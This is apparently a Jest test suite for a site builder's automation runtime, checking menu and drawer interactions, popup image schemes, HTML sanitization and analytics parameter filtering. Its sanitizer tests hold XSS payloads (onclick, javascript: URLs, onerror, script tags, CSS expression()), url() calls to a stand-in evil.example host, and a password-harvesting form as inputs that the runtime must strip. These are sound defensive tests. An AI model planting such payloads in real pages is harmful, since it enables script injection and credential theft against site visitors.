/**
 * @license
 * Copyright 2026 Aglyn LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import * as Aglyn from '@aglyn/aglyn'
import { resetAuthoredEventWarnings } from '@aglyn/aglyn/app-utils/analytics-events'
import { fireEvent, render, screen, waitFor } from '@testing-library/react'
import type { ClientAutomation, PopupData } from '../model/site-contract'
import { MarketingSiteRuntime } from './site-runtime'

/**
 * Interaction executor matrix (AGL-562): the automations engine armed
 * with click/hover triggers running the element show/hide and drawer
 * steps against a real (jsdom) DOM.
 */

const HIDDEN = Aglyn.ELEMENT_HIDDEN_CLASS

let unmounts: Array<() => void> = []

const runEngine = (automations: Array<Partial<ClientAutomation>>) => {
  const utils = render(
    <MarketingSiteRuntime
      hostId="host-1"
      screens={{}}
      page={{
        announcementBar: null,
        popup: null,
        experiments: [],
        automationOverlays: null,
        clientAutomations: automations.map((automation, index) => ({
          id: `auto-${index}`,
          hasServerSteps: false,
          steps: [],
          event: 'pageVisit',
          ...automation,
        })),
      }}
    />,
  )
  unmounts.push(utils.unmount)
  return utils
}

describe('automations engine — nav interactions (AGL-562)', () => {
  let target: HTMLElement
  let button: HTMLElement

  beforeEach(() => {
    document.body.innerHTML =
      '<button id="menu-button">Menu</button>' +
      '<nav id="links" data-aglyn="leaf:links-1">Links</nav>'
    target = document.getElementById('links') as HTMLElement
    button = document.getElementById('menu-button') as HTMLElement
  })

  afterEach(() => {
    for (const unmount of unmounts) unmount()
    unmounts = []
  })

  it('toggles the target on every click when everyTime is set', () => {
    runEngine([
      {
        event: 'elementClick',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'toggleElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
    ])
    fireEvent.click(button)
    expect(target.classList.contains(HIDDEN)).toBe(true)
    fireEvent.click(button)
    expect(target.classList.contains(HIDDEN)).toBe(false)
    fireEvent.click(button)
    expect(target.classList.contains(HIDDEN)).toBe(true)
  })

  describe('attribute steps announce a hand-built disclosure (AGL-2546)', () => {
    it('sets and removes an aria attribute on the target', () => {
      runEngine([
        {
          event: 'elementClick',
          selector: '#menu-button',
          everyTime: true,
          steps: [
            {
              type: 'setAttribute',
              selector: '[data-aglyn="leaf:links-1"]',
              name: 'aria-expanded',
              value: 'true',
            },
          ],
        },
      ])
      fireEvent.click(button)
      expect(target.getAttribute('aria-expanded')).toBe('true')

      runEngine([
        {
          event: 'elementClick',
          selector: '#menu-button',
          everyTime: true,
          steps: [
            {
              type: 'removeAttribute',
              selector: '[data-aglyn="leaf:links-1"]',
              name: 'aria-expanded',
            },
          ],
        },
      ])
      fireEvent.click(button)
      expect(target.hasAttribute('aria-expanded')).toBe(false)
    })

    it('REFUSES a name outside the allowlist, at the runtime', () => {
      // The console form also refuses it, but the form is a convenience.
      // A step reaches this loop from a stored document, which may predate
      // the allowlist or never have passed through the console at all — so
      // the runtime is where the refusal has to be real.
      runEngine([
        {
          event: 'elementClick',
          selector: '#menu-button',
          everyTime: true,
          steps: [
            {
              type: 'setAttribute',
              selector: '[data-aglyn="leaf:links-1"]',
              name: 'onclick',
              value: 'alert(1)',
            },
          ],
        },
      ])
      fireEvent.click(button)
      expect(target.hasAttribute('onclick')).toBe(false)
    })

    it('a refused name does not swallow the steps after it', () => {
      // The executor wraps each automation in try/catch, so a throw here
      // would silently drop every later step in the same automation — the
      // author would see one typo disable an entire interaction.
      runEngine([
        {
          event: 'elementClick',
          selector: '#menu-button',
          everyTime: true,
          steps: [
            {
              type: 'setAttribute',
              selector: '[data-aglyn="leaf:links-1"]',
              name: 'href',
              value: 'javascript:alert(1)',
            },
            {
              type: 'setAttribute',
              selector: '[data-aglyn="leaf:links-1"]',
              name: 'aria-expanded',
              value: 'true',
            },
          ],
        },
      ])
      fireEvent.click(button)
      expect(target.hasAttribute('href')).toBe(false)
      expect(target.getAttribute('aria-expanded')).toBe('true')
    })

    it('reaches a layout-namespaced element from a raw-id selector', () => {
      // Same `expandLeafSelector` path the visibility steps use (AGL-573).
      // Without it the step works in the canvas and silently misses on a
      // composed page, which is the worst possible failure shape.
      document.body.innerHTML =
        '<button id="menu-button">Menu</button>' +
        '<nav id="ns" data-aglyn="leaf:layout__links-1">Links</nav>'
      const namespaced = document.getElementById('ns') as HTMLElement
      runEngine([
        {
          event: 'elementClick',
          selector: '#menu-button',
          everyTime: true,
          steps: [
            {
              type: 'setAttribute',
              selector: '[data-aglyn="leaf:links-1"]',
              name: 'aria-expanded',
              value: 'true',
            },
          ],
        },
      ])
      fireEvent.click(document.getElementById('menu-button') as HTMLElement)
      expect(namespaced.getAttribute('aria-expanded')).toBe('true')
    })
  })

  it('fires once per pageview without everyTime (legacy default)', () => {
    runEngine([
      {
        event: 'elementClick',
        selector: '#menu-button',
        steps: [
          { type: 'toggleElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
    ])
    fireEvent.click(button)
    fireEvent.click(button)
    // A repeat toggle would have flipped it back visible.
    expect(target.classList.contains(HIDDEN)).toBe(true)
  })

  it('shows on hover enter and hides on hover leave', () => {
    runEngine([
      {
        event: 'elementHoverEnter',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'showElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
      {
        event: 'elementHoverLeave',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'hideElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
    ])
    target.classList.add(HIDDEN)
    fireEvent.mouseOver(button, { relatedTarget: document.body })
    expect(target.classList.contains(HIDDEN)).toBe(false)
    fireEvent.mouseOut(button, { relatedTarget: document.body })
    expect(target.classList.contains(HIDDEN)).toBe(true)
  })

  it('ignores hover moves within the matched element', () => {
    button.innerHTML = '<span id="inner">Menu</span>'
    const inner = document.getElementById('inner') as HTMLElement
    runEngine([
      {
        event: 'elementHoverLeave',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'hideElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
    ])
    // Pointer moves from the button onto its own child — not a leave.
    fireEvent.mouseOut(button, { relatedTarget: inner })
    expect(target.classList.contains(HIDDEN)).toBe(false)
    fireEvent.mouseOut(button, { relatedTarget: document.body })
    expect(target.classList.contains(HIDDEN)).toBe(true)
  })

  it('shows a target that was hidden with inline display too', () => {
    target.style.display = 'none'
    runEngine([
      {
        event: 'elementClick',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'showElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
    ])
    fireEvent.click(button)
    expect(target.style.display).toBe('')
    expect(target.classList.contains(HIDDEN)).toBe(false)
  })

  it('dispatches drawer commands over the shared event bus', () => {
    const seen: Aglyn.DrawerCommandDetail[] = []
    const unsubscribe = Aglyn.subscribeDrawerCommands((d) => seen.push(d))
    runEngine([
      {
        event: 'elementClick',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'openDrawer', drawerNodeId: 'drawer-9' },
          { type: 'toggleDrawer' },
          { type: 'closeDrawer', drawerNodeId: 'drawer-9' },
        ],
      },
    ])
    fireEvent.click(button)
    unsubscribe()
    expect(seen).toEqual([
      { command: 'open', nodeId: 'drawer-9' },
      { command: 'toggle' },
      { command: 'close', nodeId: 'drawer-9' },
    ])
  })

  it('dispatches menu commands over their own event bus (AGL-568)', () => {
    const seen: Aglyn.MenuCommandDetail[] = []
    const unsubscribe = Aglyn.subscribeMenuCommands((d) => seen.push(d))
    runEngine([
      {
        event: 'elementClick',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'openMenu', menuNodeId: 'menu-9' },
          { type: 'toggleMenu' },
          { type: 'closeMenu', menuNodeId: 'menu-9' },
        ],
      },
    ])
    fireEvent.click(button)
    unsubscribe()
    // Click-triggered commands carry no hover flag.
    expect(seen).toEqual([
      { command: 'open', nodeId: 'menu-9' },
      { command: 'toggle' },
      { command: 'close', nodeId: 'menu-9' },
    ])
  })

  it('stamps the hover flag on hover-enter-triggered menu opens', () => {
    const seen: Aglyn.MenuCommandDetail[] = []
    const unsubscribe = Aglyn.subscribeMenuCommands((d) => seen.push(d))
    runEngine([
      {
        event: 'elementHoverEnter',
        selector: '#menu-button',
        everyTime: true,
        steps: [{ type: 'openMenu', menuNodeId: 'menu-9' }],
      },
    ])
    fireEvent.mouseOver(button, { relatedTarget: document.body })
    unsubscribe()
    // The hover flag is what makes the menu close itself on pointer
    // leave of the trigger + panel surface.
    expect(seen).toEqual([
      { command: 'open', nodeId: 'menu-9', hover: true },
    ])
  })

  it('hovers a layout-namespaced live element from a raw-id trigger + opens the menu (AGL-573)', () => {
    // Reproduces the Northwind Shop dropdown: the live element carries the
    // `layout__`-namespaced id while the interaction was authored against
    // the raw canvas id (both the hover selector and the openMenu step id).
    document.body.innerHTML =
      '<div data-aglyn="leaf:layout___5I3TBXywa">Shop</div>'
    const live = document.querySelector(
      '[data-aglyn="leaf:layout___5I3TBXywa"]',
    ) as HTMLElement
    const seen: Aglyn.MenuCommandDetail[] = []
    const unsubscribe = Aglyn.subscribeMenuCommands((d) => seen.push(d))
    runEngine([
      {
        event: 'elementHoverEnter',
        selector: '[data-aglyn="leaf:_5I3TBXywa"]',
        everyTime: true,
        steps: [{ type: 'openMenu', menuNodeId: '_5I3TBXywa' }],
      },
    ])
    fireEvent.mouseOver(live, { relatedTarget: document.body })
    unsubscribe()
    expect(seen).toEqual([
      { command: 'open', nodeId: '_5I3TBXywa', hover: true },
    ])
  })

  it('does not fire the raw-id hover trigger on an unrelated namespaced element (AGL-573)', () => {
    document.body.innerHTML =
      '<div data-aglyn="leaf:layout__X_5I3TBXywaY">Decoy</div>'
    const decoy = document.querySelector(
      '[data-aglyn="leaf:layout__X_5I3TBXywaY"]',
    ) as HTMLElement
    const seen: Aglyn.MenuCommandDetail[] = []
    const unsubscribe = Aglyn.subscribeMenuCommands((d) => seen.push(d))
    runEngine([
      {
        event: 'elementHoverEnter',
        selector: '[data-aglyn="leaf:_5I3TBXywa"]',
        everyTime: true,
        steps: [{ type: 'openMenu', menuNodeId: '_5I3TBXywa' }],
      },
    ])
    fireEvent.mouseOver(decoy, { relatedTarget: document.body })
    unsubscribe()
    expect(seen).toEqual([])
  })

  it('injects the hidden-class rule when running the element steps', () => {
    document.getElementById(Aglyn.ELEMENT_HIDDEN_STYLE_ID)?.remove()
    runEngine([
      {
        event: 'elementClick',
        selector: '#menu-button',
        everyTime: true,
        steps: [
          { type: 'hideElement', selector: '[data-aglyn="leaf:links-1"]' },
        ],
      },
    ])
    fireEvent.click(button)
    expect(
      document.getElementById(Aglyn.ELEMENT_HIDDEN_STYLE_ID),
    ).toBeTruthy()
  })
})

/**
 * The popup image is a free-text console field rendered verbatim — one of
 * AGL-1725's raw author `<img>` sinks, and (with the events cover) one of
 * the two `http:`-accepting egresses left after AGL-1713 and the collection
 * cover fix. Scheme rule only, never a host check: the site owner picks the
 * host; the scheme is what protects their visitors.
 */
describe('the popup image refuses the http: scheme (AGL-1725)', () => {
  afterEach(() => {
    unmounts.forEach((unmount) => unmount())
    unmounts = []
  })

  const mountWithPopup = (popup: PopupData) => {
    window.localStorage.clear()
    const utils = render(
      <MarketingSiteRuntime
        hostId="host-1"
        screens={{}}
        page={{
          announcementBar: null,
          popup,
          experiments: [],
          automationOverlays: null,
          clientAutomations: [],
        }}
      />,
    )
    unmounts.push(utils.unmount)
    return utils
  }

  const popupWith = (imageUrl: string): PopupData => ({
    body: 'Join the list',
    trigger: 'delay',
    triggerValue: 0,
    frequencyDays: 30,
    contentHash: `hash-${imageUrl}`,
    imageUrl,
  })

  it('renders an https image as stored — the advertised hotlink path', async () => {
    mountWithPopup(popupWith('https://cdn.example/hero.png'))
    await waitFor(() => expect(screen.getByRole('dialog')).toBeTruthy())
    const img = screen.getByRole('dialog').querySelector('img')
    expect(img?.getAttribute('src')).toBe('https://cdn.example/hero.png')
  })

  it('renders the media picker relative form', async () => {
    mountWithPopup(popupWith('/api/media/cdn/host-1/m-1'))
    await waitFor(() => expect(screen.getByRole('dialog')).toBeTruthy())
    const img = screen.getByRole('dialog').querySelector('img')
    expect(img?.getAttribute('src')).toBe('/api/media/cdn/host-1/m-1')
  })

  it('renders the popup WITHOUT the image for an http: url', async () => {
    mountWithPopup(popupWith('http://tracker.example/pixel.png'))
    // The popup itself still opens — only the insecure egress is dropped.
    await waitFor(() => expect(screen.getByRole('dialog')).toBeTruthy())
    expect(screen.getByRole('dialog').querySelector('img')).toBeNull()
  })

  /**
   * AGL-1896. This image rendered with a HARDCODED `alt=""` and there was no
   * field anywhere that could have changed it — an author-chosen banner, on
   * a paying customer's published site, invisible to a screen reader by
   * construction. Not a default anyone chose; simply the only alt the markup
   * could produce.
   *
   * Read through `getAttribute`, not `getByAltText`/`innerText`: the
   * assertion is about the attribute that reaches the customer's HTML.
   */
  it('renders the popup image alt the author stored', async () => {
    mountWithPopup({
      ...popupWith('https://cdn.example/hero.png'),
      imageAlt: 'Two people unpacking a delivery box',
    })
    await waitFor(() => expect(screen.getByRole('dialog')).toBeTruthy())
    const img = screen.getByRole('dialog').querySelector('img')
    expect(img?.getAttribute('alt')).toBe(
      'Two people unpacking a delivery box',
    )
  })

  /**
   * The unchanged half. An empty alt is the CORRECT markup for a genuinely
   * decorative banner sitting beside its own headline, so a popup whose
   * author stored none must keep emitting `alt=""` — present and empty, not
   * missing, which is a different thing to a screen reader.
   */
  it('still emits an empty alt when the author stored none', async () => {
    mountWithPopup(popupWith('https://cdn.example/hero.png'))
    await waitFor(() => expect(screen.getByRole('dialog')).toBeTruthy())
    const img = screen.getByRole('dialog').querySelector('img')
    expect(img?.hasAttribute('alt')).toBe(true)
    expect(img?.getAttribute('alt')).toBe('')
  })
})

/**
 * `showHtml` runs the SHARED author-HTML sanitizer (AGL-2486).
 *
 * These drive `MarketingSiteRuntime` rather than calling
 * `sanitizeAuthorHtml` directly, on purpose. The sanitizer has its own unit
 * suite; what was wrong here was never that the function misbehaved, it was
 * that this step called a DIFFERENT one — so the only assertion that can
 * catch a regression is one that reads the DOM this step actually appends to
 * the visitor's page. Pointing `container.innerHTML` back at DOMPurify turns
 * every case below red; passing the string through `sanitizeAuthorHtml`
 * somewhere other than this step turns none of them red.
 */
describe('showHtml sanitization on the real render path (AGL-2486)', () => {
  let unmount: () => void

  const showHtml = (html: string) => {
    const utils = runEngine([{ event: 'pageVisit', steps: [{ type: 'showHtml', html }] }])
    unmount = utils.unmount
  }

  /** The nodes this step appended to `document.body`, as the visitor holds them. */
  const injected = (): HTMLElement =>
    document.body.lastElementChild as HTMLElement

  afterEach(() => {
    unmount?.()
    document.body.innerHTML = ''
  })

  it('neuters an http: url() in a style attribute', () => {
    showHtml('<div style="background-image:url(http://evil.example/p.png?c=1)">x</div>')
    const div = injected().querySelector('div') as HTMLElement
    expect(div.getAttribute('style')).toContain('about:invalid')
    expect(div.getAttribute('style')).not.toContain('evil.example')
  })

  it('decodes a character reference before judging the scheme', () => {
    // DOMPurify emitted a literal `http://…` here: it never decoded the
    // reference, so its output was MORE dangerous than its input looked.
    showHtml('<div style="background:url(&#104;ttp://evil.example/x.png)">x</div>')
    const div = injected().querySelector('div') as HTMLElement
    expect(div.getAttribute('style')).not.toContain('evil.example')
  })

  it.each([
    ['@import', '@import url(https://evil.example/x.css)'],
    ['expression()', 'width:expression(alert(1))'],
    ['-moz-binding', '-moz-binding:url(http://evil.example/x.xml#e)'],
    ['behavior:', 'behavior:url(#default#time2)'],
    ['javascript: url()', 'background:url(javascript:alert(1))'],
  ])('drops the whole style attribute for %s', (_name, css) => {
    showHtml(`<div style="${css}">x</div>`)
    const div = injected().querySelector('div') as HTMLElement
    expect(div.hasAttribute('style')).toBe(false)
    // The element and its words survive — this refuses CSS, not content.
    expect(div.textContent).toBe('x')
  })

  it('drops a credential-harvesting form', () => {
    // The old FORBID_TAGS list omitted `form`, alone among this repo's
    // author-HTML configs, so this markup reached the page intact.
    showHtml('<form action="https://evil.example"><input name="p" type="password"></form>')
    expect(injected().querySelector('form')).toBeNull()
    expect(injected().querySelector('input')).toBeNull()
  })

  it('still refuses everything the old config refused', () => {
    showHtml('<img src="x" onerror="alert(1)"><script>alert(2)</script><iframe src="https://e.example"></iframe>')
    const root = injected()
    expect(root.querySelector('script')).toBeNull()
    expect(root.querySelector('iframe')).toBeNull()
    expect(root.querySelector('img')?.hasAttribute('onerror')).toBe(false)
  })

  it('leaves benign author styling byte-identical', () => {
    // The no-regression half: real inline styling must survive untouched, or
    // this fix blanks somebody's site.
    showHtml('<div style="color:#333;margin:8px auto;font-size:14px">hello</div>')
    const div = injected().querySelector('div') as HTMLElement
    expect(div.getAttribute('style')).toBe('color:#333;margin:8px auto;font-size:14px')
    expect(div.textContent).toBe('hello')
  })

  it('keeps a first-party and an https third-party url()', () => {
    // Deliberately NOT blocked: the site owner choosing a host for their own
    // visitors is the AGL-1725 actor analysis, not a scheme problem.
    showHtml('<div style="background-image:url(https://cdn.example/p.png)">x</div>')
    const div = injected().querySelector('div') as HTMLElement
    expect(div.getAttribute('style')).toContain('https://cdn.example/p.png')
  })
})

/**
 * Authored analytics events on the real render path (AGL-1587).
 *
 * The sanitizer and the reserved-name refusal have their own unit suite in
 * `analytics-events.spec.ts`. What is untested there — and what actually
 * broke in the shipped feature — is the WIRE: whether this step hands the
 * authored name AND the authored params to `trackAuthoredEvent` at all. So
 * nothing is mocked here. `trackAuthoredEvent` is the real one, and the
 * assertion reads `window.gtag`, which is the same delivery a consenting
 * visitor's browser gives it. A step that dropped `params` on the floor, or
 * called `gtag` directly and skipped the sanitizer, fails every case below;
 * mocking the tracker would let both regressions through.
 */
describe('authored analytics events on the real render path (AGL-1587)', () => {
  let unmount: (() => void) | undefined
  let calls: unknown[][]
  let warn: jest.SpyInstance

  beforeEach(() => {
    calls = []
    ;(window as unknown as { gtag: unknown }).gtag = (...args: unknown[]) => {
      calls.push(args)
    }
    // The tracker warns once per refused name FOR THE LIFE OF THE MODULE, so
    // a refusal case would go quiet after the first spec that provoked it.
    resetAuthoredEventWarnings()
    warn = jest.spyOn(console, 'warn').mockImplementation(() => undefined)
    document.body.innerHTML = '<button id="cta">Buy</button>'
  })

  afterEach(() => {
    unmount?.()
    unmount = undefined
    warn.mockRestore()
    delete (window as unknown as { gtag?: unknown }).gtag
    document.body.innerHTML = ''
  })

  const clickTracks = (step: Record<string, unknown>) => {
    const utils = runEngine([
      { event: 'elementClick', selector: '#cta', everyTime: true, steps: [step as never] },
    ])
    unmount = utils.unmount
    fireEvent.click(document.getElementById('cta') as HTMLElement)
  }

  it('delivers the authored name and the authored parameters', () => {
    clickTracks({
      type: 'trackGaEvent',
      eventName: 'cta_click',
      params: { plan: 'starter', placement: 'hero' },
    })

    expect(calls).toHaveLength(1)
    expect(calls[0][0]).toBe('event')
    expect(calls[0][1]).toBe('cta_click')
    expect(calls[0][2]).toEqual({ plan: 'starter', placement: 'hero' })
  })

  it('runs the params through the shared sanitizer, not raw gtag', () => {
    // The step reached the page with a form field bound into a parameter,
    // which is how a visitor's address gets into a site's analytics property.
    clickTracks({
      type: 'trackGaEvent',
      eventName: 'quote_requested',
      params: { plan: 'pro', email: 'buyer@example.com', contact: 'buyer@example.com' },
    })

    // The denied KEY and the address-shaped VALUE under an innocent key are
    // both gone — a step calling gtag directly would deliver all three.
    expect(calls[0][2]).toEqual({ plan: 'pro' })
  })

  it('refuses a reserved name, dropping the hit rather than polluting a real metric', () => {
    clickTracks({
      type: 'trackGaEvent',
      eventName: 'purchase',
      params: { plan: 'starter', placement: 'hero' },
    })

    expect(calls).toHaveLength(0)
    expect(String(warn.mock.calls[0]?.[0])).toMatch(/reserved/)
  })

  it('sends the SAME parameters under a name that is not reserved', () => {
    // The control for the refusal above. Without it, a step that silently
    // failed for every name — a broken selector, a params shape the executor
    // throws on — would pass the reserved-name case for the wrong reason.
    clickTracks({
      type: 'trackGaEvent',
      eventName: 'purchase_intent',
      params: { plan: 'starter', placement: 'hero' },
    })

    expect(calls).toHaveLength(1)
    expect(calls[0][1]).toBe('purchase_intent')
    expect(calls[0][2]).toEqual({ plan: 'starter', placement: 'hero' })
  })
})
